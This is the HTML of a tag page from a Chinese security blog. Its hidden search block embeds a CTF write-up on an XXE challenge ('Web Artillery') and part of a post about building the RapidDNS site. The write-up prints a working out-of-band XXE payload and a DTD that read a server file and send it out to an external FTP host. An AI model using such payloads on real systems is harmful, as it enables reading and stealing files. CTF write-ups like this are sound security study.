<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8" />

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="keywords" content="BaCde&#39;s Blog。Security Research。">
<meta name="description" content="在攻与防的对立与统一中需求突破。">
<meta name="theme-color" content="#000">
<title>BaCde&#39;s Blog</title>
<link rel="shortcut icon" href="/favicon.ico?v=1623158184259">
<link rel="stylesheet" href="/styles/main.css">
<link rel="stylesheet" href="/media/css/gemini.css">

<link rel="stylesheet" href="/media/fonts/font-awesome.css">
<link
  href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Rosario:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext"
  rel="stylesheet" type="text/css">

<link href="/media/hljs/styles/github.css"
  rel="stylesheet">

<script src="/media/hljs/highlight.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.ui.min.js"></script>

<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
<script data-ad-client="ca-pub-8715625061980209" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>


<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-141762526-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag() { dataLayer.push(arguments); }
  gtag('js', new Date());

  gtag('config', 'UA-141762526-1');
</script>


</head>

<body>
  <div class="head-top-line"></div>
  <div class="header-box">
    
<div class="gemini">
  <header class="header  ">
    <div class="blog-header box-shadow-wrapper bg-color " id="header">
      <div class="nav-toggle" id="nav_toggle">
        <div class="toggle-box">
          <div class="line line-top"></div>
          <div class="line line-center"></div>
          <div class="line line-bottom"></div>
        </div>
      </div>
      <div class="site-meta">       
        <div class="site-title">
          
            <a href="/" class="brand">
              <span>BaCde&#39;s Blog</span>
            </a>  
          
        </div>
        
          <p class="subtitle">自由工作者，劈柴喂马周游世界</p>
        
      </div>
      <nav class="site-nav" id="site_nav">
        <ul id="nav_ul">
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/" target="_self">
                  <i class="fa fa-home"></i> 主页
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/archives/" target="_self">
                  <i class="fa fa-archive"></i> 文章列表
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/tag/prvJjB7Fua5//" target="_self">
                  <i class="fa fa-globe"></i> 汽车安全
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/tag/G8-CImT42BP//" target="_self">
                  <i class="fa fa-globe"></i> 安全工具
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/tag/JJyH5v-0vnk//" target="_self">
                  <i class="fa fa-globe"></i> 原创小说
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/tags/" target="_self">
                  <i class="fa fa-tags"></i> 文章标签
                </a>
              
            </li>
          
          
            
              <li class="nav-item ">
                <a href="/friends/" target="_self">
                  
                    <i class="fa fa-address-book"></i> 友情链接
                  
                </a>
              </li>
            
          
        </ul>
      </nav>
    </div>
  </header>
</div>

<script type="text/javascript"> 
 
  let showNav = true;

  let navToggle = document.querySelector('#nav_toggle'),
  siteNav = document.querySelector('#site_nav');
  
  function navClick() {
    let sideBar = document.querySelector('.sidebar');
    let navUl = document.querySelector('#nav_ul');
    navToggle.classList.toggle('nav-toggle-active');
    siteNav.classList.toggle('nav-menu-active');
    if (siteNav.classList.contains('nav-menu-active')) {
      siteNav.style = "height: " + (navUl.children.length * 42) +"px !important";
    } else {
      siteNav.style = "";
    }
  }

  navToggle.addEventListener('click',navClick);  
</script>
  </div>
  <div class="main-continer">
    
    <div
      class="section-layout  gemini">
      <div class="section-layout-wrapper">
        <div id="sidebarMeta" class="sidebar">
    
<div class="sidebar-wrapper box-shadow-wrapper bg-color">
  <div class="sidebar-item">
    <img class="site-author-image right-motion" src="/images/avatar.png"/>
    <p class="site-author-name">BaCde</p>
    
  </div>
  <div class="sidebar-item side-item-stat right-motion">
    <div class="sidebar-item-box">
      <a href="/archives/">
        
        <span class="site-item-stat-count">48</span>
        <span class="site-item-stat-name">文章</span>
      </a>
    </div>
    <div class="sidebar-item-box">
      <a href="">
        <span class="site-item-stat-count">145</span>
        <span class="site-item-stat-name">分类</span>
      </a>
    </div>
    <div class="sidebar-item-box">
      <a href="/tags/">
        <span class="site-item-stat-count">145</span>
        <span class="site-item-stat-name">标签</span>
      </a>
    </div>
  </div>
  
    
      <div class="sidebar-item">
        <span class="site-item-rss">
            <i class="fa fa-rss"></i>
            <a href="https://bacde.me/atom.xml" target="_blank">RSS</a>
        </span>
      </div>
    
  
  
    <div class="sidebar-item sidebar-item-social">
      <div class="social-item">
        
          
            <a href="https://rapiddns.io">
              <i class="fa fa-globe" title="Rapiddns.io"></i>
            </a>
          
            <a href="https://github.com/insightglacier">
              <i class="fa fa-github-alt" title="Github"></i>
            </a>
          
            <a href="https://twitter.com/insightGlacier">
              <i class="fa fa-twitter" title="Twitter"></i>
            </a>
          
        
        
      </div>
    </div>
  


</div>
</div>
<script>
  let sidebarMeta = document.querySelector('#sidebarMeta');
  let scheme = 'gemini';
  let sidebarWrapper = document.querySelector('.sidebar-wrapper');
  if (sidebarMeta && (scheme === 'pisces' || scheme === 'gemini')) {
    document.addEventListener('scroll', function(e) {
      if (document.scrollingElement.scrollTop > parseInt(sidebarMeta.style.marginTop) + 10) {
        sidebarWrapper.classList.add('home-sidebar-fixed')
      } else {
        sidebarWrapper.classList.remove('home-sidebar-fixed')
      }
    });
  }
  </script>
        <div class="section-box tag-line box-shadow-wrapper">
          <section class="section tags-section posts-expand bg-color">
            <div class="padding-wrapper">
  <div class="tag-timeline-box">
    <div class="tag-timeline-wrapper">
      <div class="tag-timeline-title">
        <h2>
          数据隐写
          <small>标签</small>
        </h2>
      </div>
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      <a href="https://bacde.me/post/Killer-Chapter-Nine/">
        <div class="motion-warpper">
          <div class="tag-post-node">
            <h1>
              03-21
              <small>原创小说《杀手》第九章 王者归来</small>
            </h1>
          </div>
        </div>
      </a>
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
    </div>
  </div>
</div>
          </section>
        </div>
      </div>
    </div>
    <div class="footer-box">
  <footer class="footer">
    <div class="copyright">
      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | © 2019-2020 Theme By <a href="https://github.com/hsxyhao/gridea-theme-next" target="_blank">HsxyHao</a>
    </div>
    <div class="poweredby">
      Powered by <a href="https://www.bacde.me" target="_blank">BaCde</a>
    </div>
  </footer>
  
  
  <div class="gemini back-to-top" id="back_to_top">
    <i class="fa fa-arrow-up"></i>
    
    <span class="scrollpercent">
      <span id="back_to_top_text">0</span>%
    </span>
    
  </div>
  
  
  
</div>
<script>

  let sideBarOpen = 'sidebar-open';
  let body = document.body;
  let back2Top = document.querySelector('#back_to_top'),
  back2TopText = document.querySelector('#back_to_top_text'),
  drawerBox = document.querySelector('#drawer_box'),
  rightSideBar = document.querySelector('.sidebar'),
  viewport = document.querySelector('body');

  function scrollAnimation(currentY, targetY) {
   
    let needScrollTop = targetY - currentY
    let _currentY = currentY
    setTimeout(() => {
      const dist = Math.ceil(needScrollTop / 10)
      _currentY += dist
      window.scrollTo(_currentY, currentY)
      if (needScrollTop > 10 || needScrollTop < -10) {
        scrollAnimation(_currentY, targetY)
      } else {
        window.scrollTo(_currentY, targetY)
      }
    }, 1)
  }

  back2Top.addEventListener("click", function(e) {
    scrollAnimation(document.scrollingElement.scrollTop, 0);
    e.stopPropagation();
    return false;
  });
  
  window.addEventListener('scroll', function(e) {
    let percent = document.scrollingElement.scrollTop / (document.scrollingElement.scrollHeight - document.scrollingElement.clientHeight) * 100;
    if (percent > 1 && !back2Top.classList.contains('back-top-active')) {
      back2Top.classList.add('back-top-active');
    }
    if (percent == 0) {
      back2Top.classList.remove('back-top-active');
    }
    if (back2TopText) {
      back2TopText.textContent = Math.floor(percent);
    }
  });

  
  let hasCacu = false;
  window.onresize = function() {
    if (window.width > 991) {
      calcuHeight();
    } else {
      hasCacu = false;
    }
  }

  function calcuHeight() {
    // 动态调整站点概览高度
    if (!hasCacu && back2Top.classList.contains('pisces') || back2Top.classList.contains('gemini')) {
      let sideBar = document.querySelector('.sidebar');
      let navUl = document.querySelector('#site_nav');
      sideBar.style = 'margin-top:' + (navUl.offsetHeight + navUl.offsetTop + 15) + 'px;';
      hasCacu = true;
    }
  }
  calcuHeight();
  
  let open = false, MOTION_TIME = 300, RIGHT_MOVE_DIS = '320px';

  if (drawerBox) {
    let rightMotions = document.querySelectorAll('.right-motion');
    let right = drawerBox.classList.contains('right');

    let transitionDir = right ? "transition.slideRightIn" : "transition.slideLeftIn";

    let openProp, closeProp;
    if (right) {
      openProp = {
        paddingRight: RIGHT_MOVE_DIS 
      };
      closeProp = {
        paddingRight: '0px'
      };
    } else {
      openProp = {
        paddingLeft: RIGHT_MOVE_DIS 
      };
      closeProp = {
        paddingLeft: '0px'
      };
    }

    drawerBox.onclick = function() {
      open = !open;
      window.Velocity(rightSideBar, 'stop');
      window.Velocity(viewport, 'stop');
      window.Velocity(rightMotions, 'stop');
      if (open) {
        window.Velocity(rightSideBar, {
          width: RIGHT_MOVE_DIS
        }, {
          duration: MOTION_TIME,
          begin: function() {
            window.Velocity(rightMotions, transitionDir,{ });
          }
        })
        window.Velocity(viewport, openProp,{
          duration: MOTION_TIME
        });
      } else {
        window.Velocity(rightSideBar, {
          width: '0px'
        }, {
          duration: MOTION_TIME,
          begin: function() {
            window.Velocity(rightMotions, {
              opacity: 0
            });
          }
        })
        window.Velocity(viewport, closeProp ,{
          duration: MOTION_TIME
        });
      }
      for (let i = 0; i < drawerBox.children.length; i++) {
        drawerBox.children[i].classList.toggle('muse-line');
      }
      drawerBox.classList.toggle(sideBarOpen);
    }
  }

  // 链接跳转
  let newWindow = 'false'
  if (newWindow === 'true') {
    let links = document.querySelectorAll('.post-body a')
    links.forEach(item => {
      if (!item.classList.contains('btn')) {
        item.setAttribute("target","_blank");
      }
    })
  }
  // 代码高亮
  hljs.initHighlightingOnLoad();

</script>
  </div>
</body>
<input hidden id="copy" />
<script>
  //拿来主义(真香)^_^，Clipboard 实现摘自掘金 https://juejin.im/post/5aefeb6e6fb9a07aa43c20af
  window.Clipboard = (function (window, document, navigator) {
    var textArea,
      copy;

    // 判断是不是ios端
    function isOS() {
      return navigator.userAgent.match(/ipad|iphone/i);
    }
    //创建文本元素
    function createTextArea(text) {
      textArea = document.createElement('textArea');
      textArea.value = text;
      textArea.style.width = 0;
      textArea.style.height = 0;
      textArea.clientHeight = 0;
      textArea.clientWidth = 0;
      document.body.appendChild(textArea);
    }
    //选择内容
    function selectText() {
      var range,
        selection;

      if (isOS()) {
        range = document.createRange();
        range.selectNodeContents(textArea);
        selection = window.getSelection();
        selection.removeAllRanges();
        selection.addRange(range);
        textArea.setSelectionRange(0, 999999);
      } else {
        textArea.select();
      }
    }

    //复制到剪贴板
    function copyToClipboard() {
      try {
        document.execCommand("Copy")
      } catch (err) {
        alert("复制错误！请手动复制！")
      }
      document.body.removeChild(textArea);
    }

    copy = function (text) {
      createTextArea(text);
      selectText();
      copyToClipboard();
    };

    return {
      copy: copy
    };
  })(window, document, navigator);

  function copyCode(e) {
    if (e.srcElement.tagName === 'SPAN' && e.srcElement.classList.contains('copy-code')) {
      let code = e.currentTarget.querySelector('code');
      var text = code.innerText;
      if (e.srcElement.textContent === '复制成功') {
        console.log('复制操作频率过高');
        return;
      }
      e.srcElement.textContent = '复制成功';
      (function (elem) {
        setTimeout(() => {
          if (elem.textContent === '复制成功') {
            elem.textContent = '复制代码'
          }
        }, 1000);
      })(e.srcElement)
      Clipboard.copy(text);
    }
  }

  let pres = document.querySelectorAll('pre');
  pres.forEach(pre => {
    let code = pre.querySelector('code');
    let copyElem = document.createElement('span');
    copyElem.classList.add('copy-code');
    copyElem.textContent = '复制代码';
    pre.appendChild(copyElem);
    pre.onclick = copyCode
  })
</script>
<script src="/media/js/motion.js"></script>

<script src="https://cdn.jsdelivr.net/gh/cferdinandi/smooth-scroll/dist/smooth-scroll.polyfills.min.js"></script>
<script>
  var scroll = new SmoothScroll('a[href*="#"]', {
    speed: 500
  });
</script>

<!-- <div class="search-mask" id="search_mask">
  <div class="search-box">
    <div class="search-title">
      <i class="fa fa-search"></i>
      <div class="input-box">
        <input type="text" placeholder="搜索">
      </div>
      <i class="fa fa-times-circle"></i>
    </div>
    <div class="result">
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Cyber-Apocalypse-2021-Web-Artillery-WriteUP/"" data-c="
          &lt;p&gt;大家好，我是BaCde，上周临时组队参与了HackTheBox组织的Cyber Apocalyps 2021的CTF比赛。今天主要写一下Web的Artillery，这是一道3星题（最难为4星），这是一道关于XXE利用的题，做出来的人相对很少，也花了不少时间，有些收获，这里写出来与大家分享。本文不介绍基础知识，如果要学习基础可以查看后面的推荐文章。&lt;/p&gt;
&lt;h2 id=&#34;收集信息&#34;&gt;收集信息&lt;/h2&gt;
&lt;p&gt;此次的CTF题大部分都提供源代码，并提供有Dockerfile文件，可通过docker build构建并运行。通过源码可知源代码为Java语言。openjdk 1.8.181版本，Web Server为Tomcat10。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1619594216716.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;./ctf_xxe6.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;通过Web.xml可知访问路径。访问页面只有一个搜索功能，你访问页面并在搜索框随意输入内容，可看到具体发送的请求。使用Brup记录并转发到Repeater，后面测试用。这里是自己搭建的Docker环境，访问地址http://42.192.74.184:18888。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1619594224803.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;./ctf_xxe2.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来查看源代码，具体业务实现的代码在Results.java中。功能就是接收POST提交的数据，先验证XML格式，然后在处理XML，最后解析的内容进入到数据库查询，返回结果。结合web.xml文件可知请求的路径就是上面的搜索功能了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1619594229408.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;./ctf_xxe3.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞探测&#34;&gt;漏洞探测&lt;/h2&gt;
&lt;p&gt;代码看上去基本都做了过滤处理，唯一一处就是第31行，允许file协议 。尝试读取一下/etc/passwd文件，发现报错，而且无法显示文件内容。尝试其他协议都会被拒绝。想来也不会这么简单。思路如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;尝试file://url/看是否可以外连。&lt;/li&gt;
&lt;li&gt;尝试jar:file://path!/xmlpath 这样的路径。&lt;/li&gt;
&lt;li&gt;利用系统自带的一些dtd。&lt;/li&gt;
&lt;li&gt;利用unix的socket文件。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;通过file://这样的方式可以发现发起了DNS请求，但是未收到HTTP的请求。这说明可以进行网络通信。而jar协议是支持的，找了几个路径，发现都利用失败了。而第三种，通过查看Dockerfile文件发现对系统自带的dtd文件都删掉了。第四种也没想到具体该如何利用。在测试过程中也可以注意到一个细节，就是在validate的那段代码，报错后是直接return的，如果validate通过，那么会进入下面的解析代码，导致无法利用。&lt;/p&gt;
&lt;p&gt;这里一度没有任何进展。重新梳理思路，回头继续看第一个，仔细查看了报错信息，有一个地方吸引了我,可以发现报错主要是FTP连接错误，这就解释为什么没有http请求了，因为是FTP协议。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1619594241282.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;./ctf_xxe.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;获取flag&#34;&gt;获取Flag&lt;/h2&gt;
&lt;p&gt;使用vsftpd搭建FTP服务，启用匿名访问，防火墙端口全放开。最开始就是因为防火墙没开放（pasv模式的关系），导致传输文件失败，耗了不少时间。通过FTP的方式，发现确实可以将文件内容带出来，但是/etc/passwd的文件内容只有一行。后来修改了一下payload，直接将Flag.java文件通过报错的方式显示出来。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1619594247559.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;./ctf_xxe4.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;payload如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-raw&#34;&gt;POST /search HTTP/1.1
Host: 42.192.74.184:18888
Content-Length: 131
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://42.192.74.184:18888
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Connection: close

&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE cdl [&amp;lt;!ENTITY % asd SYSTEM &amp;quot;file://42.192.74.184/evil_ftp_file.dtd&amp;quot;&amp;gt;%asd;%c;]&amp;gt;
&amp;lt;cdl&amp;gt;&amp;amp;rrr;&amp;lt;/cdl&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1619594254352.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;./ctf_xxe5.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;evil_ftp_file.dtd内容：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!ENTITY % d SYSTEM &amp;quot;file:///tomcat/webapps/ROOT/WEB-INF/classes/Flag.java&amp;quot;&amp;gt;
&amp;lt;!ENTITY % c &amp;quot;&amp;lt;!ENTITY rrr SYSTEM &#39;file://%d;另外一个ftp服务地址/%d;&#39;&amp;gt;&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;从此次解题可确定在openjdk 1.8.181环境下，使用&lt;code&gt;Validator&lt;/code&gt;并允许file协议时对xml进行validate时可以发起ftp请求，同时也支持jar协议。其他环境大家可自行测试。&lt;/p&gt;
&lt;p&gt;其利用方式有如下几种：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在这样的情况下可利用ftp外带dtd读取任意文件。&lt;/li&gt;
&lt;li&gt;在没有删除本地dtd或xml文件情况下，可利用本地的dtd、xml文件进行利用。&lt;/li&gt;
&lt;li&gt;利用jar协议，通过加载jar中的xml或dtd文件进行利用。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;一些资料推荐&#34;&gt;一些资料推荐&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://shreyapohekar.com/blogs/blind-xxe-attacks-out-of-band-interaction-techniques-oast-to-exfilterate-data/&#34;&gt;Blind XXE attacks – Out of band interaction Techniques (OAST) to exfilterate data&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/xlocux/XXE-DTD-Finder&#34;&gt;XXE-DTD-Finder&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.noob.ninja/spilling-local-files-via-xxe-when/&#34;&gt;Spilling Local Files via XXE when HTTP OOB fails&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://newrouge.medium.com/xxe-from-zero-to-hero-b38118750556&#34;&gt;XXE : From Zero to Hero&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://gosecure.github.io/xxe-workshop/#1&#34;&gt;Advanced XXE Exploitation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://immunityservices.blogspot.com/2021/02/misconfigurations-in-java-xml-parsers.html&#34;&gt;Misconfigurations in Java XML Parsers&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md&#34;&gt;XXE payloads for specific DTDs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/&#34;&gt;Exploiting XXE with local DTD files&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.h3xstream.com/2019/07/automating-local-dtd-discovery-for-xxe.html&#34;&gt;Automating local DTD discovery for XXE exploitation&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
">Cyber Apocalypse 2021 Web Artillery WriteUP</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/RapidDNS-03/"" data-c="
          &lt;p&gt;大家好！我是BaCde，2020年3月我着手开发RapidDNS这个网站，并于2020年4月1日正式上线。&lt;/p&gt;
&lt;p&gt;RapidDNS.io是一个在线域名查询和IP反向查询的网站。有超过25亿条记录，支持5种（A,AAAA,CNAME,MX,CERT）数据类型。到目前为止，网站全球Alexa排名15万左右并累计提供超过1亿次查询。现每月网站流量超过1TB。除此之外网站也被加入到Amass，OneForAll，theHarvester，Sudomy，subfinder，ksubdomain等众多知名开源项目中。&lt;/p&gt;
&lt;p&gt;接下来我就跟大家分享建设这个网站的过程。&lt;/p&gt;
&lt;h2 id=&#34;产生想法&#34;&gt;产生想法&lt;/h2&gt;
&lt;p&gt;2020年在做子域名收集的开发时，想起了Rapid7的DNS数据。经过对其进行分析后，确认是我需要的内容。于是便有了做一个在线的网站的想法，即方便自己同时又可以方便其他有需要的人。&lt;/p&gt;
&lt;p&gt;有了这个想法后就开始计划目标，确定只做子域名查询和IP地址反查。其实在开发时，想自己跑数据，但是资源有限。就决定先以Rapid7的DNS数据来尝试。后续也可根据具体情况在增加功能。&lt;/p&gt;
&lt;h2 id=&#34;面临的问题&#34;&gt;面临的问题&lt;/h2&gt;
&lt;p&gt;开始实现之前要考虑如何以最低的成本实现最好的效果。最好的效果即在多人同时访问时保证查询速度和系统稳定。因为这将直接决定采用什么样的架构来实现。&lt;/p&gt;
&lt;p&gt;先来分析下建设网站需要的东西。包括一个域名和至少一台服务器，用来存放web和数据。数据存储的空间至少要300gb，cpu至少双核，内存至少4g。这是没有增量和保存历史记录的情况。到各家云厂商,idc机房，根据这个配置对比了其价格，最低的服务器成本也要5000块一年（仅是数据存储）。&lt;/p&gt;
&lt;p&gt;因为打算做免费网站，这样的成本超出了我的预期，而且也可能性能不够。对于这个数据，国外已经有几篇数据运用的文章。其实现的思路有：1. 采用aws的Athena实现，2. 开源的DNSGrep，包括RapidDNS上线后采用mongodb实现的开源项目等。因为大多数围绕的是子域名查询，没有IP地址反查功能。而且Athena将随着用户数量增加，其费用也将非常恐怖，更适合自用。说了这么多，主要的问题说白了就是穷。&lt;/p&gt;
&lt;p&gt;另外一个省钱的思路就是从已有资源来想办法，这时想到了跟随我多年联想的笔记本电脑，它已经吃灰好久了，这是一个可利用的资源。这样只需要再买一个web服务器就可以了。根据之前调查的价格，这样的服务器一年大概需要不到2000块。&lt;/p&gt;
&lt;p&gt;但是这就产生了另外一个问题，家里的网络是光纤，没有固定ip地址，而且之前测试发现外网ip是无法直接访问的，映射端口是不行的。做端口转发？这个的性能没测试过，无法保证，也不打算采用。当然这里我想到了一个解决办法，在下面的内容中会讲到。&lt;/p&gt;
&lt;h2 id=&#34;解决方案&#34;&gt;解决方案&lt;/h2&gt;
&lt;p&gt;经过上面的考虑，最终我采用下面的结构。后来经过线上的运行情况，稳定性和查询速度还在接受的范围内。后续也可以增加worker和消息队列来支持其他方式的数据增加。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1616415608484.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;本地服务器就是我的一台笔记本电脑，其配置是3代i7，8G内存。1.2TB的固态硬盘(1TB+250TB两块组成)。数据存储与查询使用的是elasticsearch，前面加了一层nginx，并配置了认证。&lt;/p&gt;
&lt;p&gt;外部服务器是一台云主机，配置好为双核4G内存。包括nginx反向代理和Flask做的web查询界面。 外面又加了一层CDN。上面没有公网IP的问题，取了个巧，因为现在家里的网络都支持IPv6，所以外部服务器直接使用IPv6地址直连家里的笔记本电脑。&lt;/p&gt;
&lt;p&gt;这里说点额外的，对于IPv6地址是可以直接连接的，不需要做映射。一般我们家里的电脑会分配多个IPv6地址，有至少一个临时（temporary，我们连接其他电脑时使用）的地址和secured的。一般我们可以设置一个固定的即可。这里大家还是注意点，避免泄漏IPv6地址。之前看一篇公众号文章，发现对目标的IPv4地址打码了，却没有对IPv6地址打码，这个挺危险的。&lt;/p&gt;
&lt;p&gt;以上这套结构的成本为域名450元，cdn服务器免费的，服务器每月费用20美元（差不多140元），电费每月大概60元。前期投入买了一块三星的SSD，成本1000元。截止目前为止，共投入450+2400+1000=3850元。后续维持现状基本是服务器加域名成本，一年2850元。&lt;/p&gt;
&lt;h2 id=&#34;编码&#34;&gt;编码&lt;/h2&gt;
&lt;p&gt;需要的一些基础知识：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;html+javascript+css基础&lt;/li&gt;
&lt;li&gt;python+flask基础&lt;/li&gt;
&lt;li&gt;elasticsearch基础&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;其实想好了方案，而且本身也不复杂，具体编码就相对简单了许多。比如查询界面的开发，我直接找了一套现成的模版，改改样式就可以了。后端flask边看文档边开发就可以了，没啥好说的。唯一要说一下的是这里flask使用了协程，其查询效果好了很多。当然后面跟insight-labs的A牛沟通过可以换bjoern，据说效果很好，不过这个我没测试，感兴趣的可以试试看，看完也可以分享出来让我学习学习。&lt;/p&gt;
&lt;p&gt;主要的还是在Elasticsearch这里，这里选择他主要因为我比较熟悉，而且有IP字段类型，做IP段查询时非常方便。这里换乘其他的如mongodb、mysql等也可以。mysql使用myisam，加上Partition问题也不大，Insight-labs的QQ群数据查询就是成功案例。大家可以选择自己擅长的。&lt;/p&gt;
&lt;p&gt;后来有朋友过来交流查询速度问题，说他那边的查询速度没我的快。其实主要我这边做了一些优化处理。我在导入数据时，对域名处理，将根域名单独存放一个字段，剩下的部分单独放一个字段。因为不需要模糊匹配，查询速度就会非常快，同时存储空间也可以节省几十G。当然，这牺牲掉了模糊搜索的功能。具体字段可以看下图：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1616415600955.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;创建mapping：&lt;/p&gt;
